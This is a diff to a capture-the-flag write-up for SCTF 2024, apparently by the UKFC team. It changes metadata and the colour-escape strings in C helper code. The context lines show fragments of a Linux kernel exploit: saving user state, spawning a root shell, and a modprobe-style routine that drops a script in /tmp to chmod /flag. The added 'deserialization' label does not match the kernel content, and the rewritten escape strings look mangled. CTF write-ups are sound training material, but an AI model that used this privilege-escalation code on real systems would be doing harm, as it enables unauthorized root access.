@@ -77,6 +77,9 @@ prerequisites:
 - Go 二进制 .rodata 字符串拼接
 - Linux 内核 userfaultfd + tty_struct 利用
 - RSA 连分数展开解 p,q
+contest_normalized: "SCTF"
+contest_year: 2024
+subcategory_guess: "deserialization"
 ---
 # UKFC2024 SCTF WP
 
@@ -130,12 +133,12 @@ struct request{ char *rd; size_t a1; size_t a2; size_t a3; size_t a4; size_t a5;
 };
 void get_shell() { system("/bin/sh");}size_t user_cs, user_rflags, user_sp, user_ss;
 void save_status() { __asm__("mov user_cs, cs;" "mov user_ss, ss;" "mov user_sp, rsp;" "pushf;" "pop user_rflags;"); puts("[*] status has been saved.");}
-void err_exit(char *msg){ printf(" 33[31m 33[1m[x] Error at:  33[0m%sn", msg); sleep(5); exit(EXIT_FAILURE);}
-void info(char *msg){ printf(" 33[32m 33[1m[+] %sn 33[0m", msg);}
-void hexx(char *msg, size_t value){ printf(" 33[32m 33[1m[+] %s: %#lxn 33[0m", msg, value);}
+void err_exit(char *msg){ printf("\\x0033[31m\\x0033[1m[x] Error at: \\x0033[0m%sn", msg); sleep(5); exit(EXIT_FAILURE);}
+void info(char *msg){ printf("\\x0033[32m\\x0033[1m[+] %sn\\x0033[0m", msg);}
+void hexx(char *msg, size_t value){ printf("\\x0033[32m\\x0033[1m[+] %s: %#lxn\\x0033[0m", msg, value);}
 /* bind the process to specific core */void bind_core(int core){ cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set); CPU_SET(core, &cpu_set); sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
- printf(" 33[34m 33[1m[*] Process binded to core  33[0m%dn", core);}
+ printf("\\x0033[34m\\x0033[1m[*] Process binded to core \\x0033[0m%dn", core);}
 void get_flag(){ system("echo -ne '#!/bin/shn/bin/chmod 777 /flag' > /tmp/x"); system("chmod +x /tmp/x"); system("echo -ne '\xff\xff\xff\xff' > /tmp/sekiro"); system("chmod +x /tmp/sekiro"); system("/tmp/sekiro"); sleep(0.3); system("cat /flag"); exit(0);}size_t orignal[0x30];pthread_t pwn;
 size_t uffd_buf[512];
 size_t kernel_offset ;
@@ -280,12 +283,12 @@ struct request{ char *rd; size_t a1; size_t a2; size_t a3; size_t a4; size_t a5;
 };
 void get_shell() { system("/bin/sh");}size_t user_cs, user_rflags, user_sp, user_ss;
 void save_status() { __asm__("mov user_cs, cs;" "mov user_ss, ss;" "mov user_sp, rsp;" "pushf;" "pop user_rflags;"); puts("[*] status has been saved.");}
-void err_exit(char *msg){ printf(" 33[31m 33[1m[x] Error at:  33[0m%sn", msg); sleep(5); exit(EXIT_FAILURE);}
-void info(char *msg){ printf(" 33[32m 33[1m[+] %sn 33[0m", msg);}
-void hexx(char *msg, size_t value){ printf(" 33[32m 33[1m[+] %s: %#lxn 33[0m", msg, value);}
+void err_exit(char *msg){ printf("\\x0033[31m\\x0033[1m[x] Error at: \\x0033[0m%sn", msg); sleep(5); exit(EXIT_FAILURE);}
+void info(char *msg){ printf("\\x0033[32m\\x0033[1m[+] %sn\\x0033[0m", msg);}
+void hexx(char *msg, size_t value){ printf("\\x0033[32m\\x0033[1m[+] %s: %#lxn\\x0033[0m", msg, value);}
 /* bind the process to specific core */void bind_core(int core){ cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set); CPU_SET(core, &cpu_set); sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
- printf(" 33[34m 33[1m[*] Process binded to core  33[0m%dn", core);}
+ printf("\\x0033[34m\\x0033[1m[*] Process binded to core \\x0033[0m%dn", core);}
 void get_flag(){ system("echo -ne '#!/bin/shn/bin/chmod 777 /flag' > /tmp/x"); system("chmod +x /tmp/x"); system("echo -ne '\xff\xff\xff\xff' > /tmp/sekiro"); system("chmod +x /tmp/sekiro"); system("/tmp/sekiro"); sleep(0.3); system("cat /flag"); exit(0);}size_t orignal[0x30];pthread_t pwn;
 size_t uffd_buf[512];
 size_t kernel_offset ;
